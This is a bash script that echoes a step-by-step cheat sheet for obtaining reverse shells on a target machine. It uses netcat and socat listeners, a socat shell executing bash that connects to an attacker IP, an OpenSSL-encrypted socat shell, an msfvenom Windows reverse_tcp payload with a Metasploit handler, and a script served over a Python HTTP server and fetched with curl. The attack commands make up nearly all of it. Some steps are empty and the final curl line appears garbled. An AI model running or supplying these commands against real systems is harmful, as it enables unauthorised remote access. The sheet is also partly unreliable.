#!/bin/bash

echo "	(1) Get a reverse shell from remote host to your local host"
echo "		1.1) Set up a listener on your localhost"
echo "			nc -nlvp <port>"
echo "		1.2) Generate a reverse shell command using the website: revshell.com"
echo "		1.3) Run the revshell command on your remote host to connect to your local host"
echo ""
echo "	(2) Use SoCat instead of Netcat (nc)"
echo "		1.1) Transfer socat statically compiled binary to target machine"
echo "			"
echo "		2.2) Set up listener on attacker machine (we assume reverse shell):"
echo "			socat TCP-L:<port> FILE:\`tty\`,raw,echo=0"
echo "		2.3) Connect the target machine to the attacker machine"
echo "			socat TCP:<attacker-ip>:<attacker-listener-port> EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane"
echo ""
echo "	(3) SoCat Encrypted Shell, assuming socat binary on target machine"
echo "		3.1) Generate a certificate"
echo "			openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days <no-of-days> -out shell.crt"
echo "		3.2) Merge the two created files into a single .pem file"
echo "			cat shell.key shell.crt > shell.pem"
echo "		3.3) Set up an encrypted listener on attacker machine"
echo "			socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -"
echo "		3.4) Connect to the listener from target machine"
echo "			socat OPENSSL:<attacker-ip>:<attacker-port>,verify=0 EXEC:/bin/bash"	
echo ""
echo "	(4) Use Metasploit (incl. msfvenom) to generate shell payload"
echo "		4.1) Generate msfvenoom payload on attacker machine"
echo "			4.1.1) If target is GNU/Linux"
echo "				"
echo "			4.1.2) If target is Windows"
echo "				msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<attacker-listen-ip> LPORT=<attacker-listen-port>"
echo "		4.2) Generate a handler with Metasploit on attacker machine"
echo "			msfconsole"
echo "			use multi/handler"
echo "			set LHOST and LPORT"
echo "		4.3) Transfer msfvenom payload, start the handler, and run the payload on target machine"
echo "			<Transfer venom shell payload using preferred way>"
echo "			(In msfconsole): exploit"
echo "			(On target machine): ./<venom-shell-payload>"
echo ""
echo "	(5) Transfer and run revshell file if revshell command doesn't work"
echo "		5.1) Put revshell command in a file, exploit.sh"
echo "			bash -c \'bash -i ..."
echo "		5.2) Serve the file on your computer in another window"
echo "			python3 -m http.server 1337"
echo "		5.3) Submit the payload with Burp"
echo "			curl http://<my-ip>:1337/exploit.sh/bash"







